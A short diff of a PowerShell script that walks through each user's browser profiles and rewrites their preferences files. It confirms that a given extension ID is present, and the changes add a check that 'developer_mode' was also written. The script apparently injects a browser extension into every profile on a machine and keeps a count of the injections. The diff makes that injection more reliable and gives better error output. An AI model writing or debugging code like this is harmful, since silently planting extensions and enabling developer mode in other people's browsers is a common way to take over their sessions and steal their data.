@@ -156,7 +156,7 @@ try {
                         $null = $cand | ConvertFrom-Json
                         $out = $cand
                     } catch {
-                        $convErr = $_.Exception.Message
+                        $convErr = "$($_.Exception.Message) size=$($prefsRaw.Length)"
                     }
                     if (-not $out -and $useJsx) {
                         try {
@@ -194,8 +194,8 @@ try {
                     }
                     [IO.File]::WriteAllText($prefsPath, $out, (New-Object System.Text.UTF8Encoding($false)))
                     $readback = [IO.File]::ReadAllText($prefsPath)
-                    if ($readback.IndexOf($ExtensionId) -lt 0) {
-                        $lastErr = "readback $($u.Name)/$($profile.Name): id not found"
+                    if ($readback.IndexOf($ExtensionId) -lt 0 -or $readback.IndexOf('developer_mode') -lt 0) {
+                        $lastErr = "readback $($u.Name)/$($profile.Name): id or dev missing"
                         continue
                     }
                     $injCount++
